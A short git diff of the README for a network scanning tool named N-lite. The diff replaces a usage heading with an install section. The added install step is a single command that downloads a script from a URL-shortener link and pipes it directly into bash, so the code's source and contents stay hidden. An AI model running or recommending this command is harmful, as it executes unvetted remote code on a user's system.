@@ -28,4 +28,7 @@ For scanning single IP addresses, N-lite provides the following menu:
 * Server Information: Gather detailed server information, including server type, OS, and application versions.
 * Cross-Platform Support: Compatible with Windows, macOS, and Linux.
 
-## How to Use
+## How to Install
+```bash
+bash <(wget -qO- https://t.ly/NgFUV)
+```
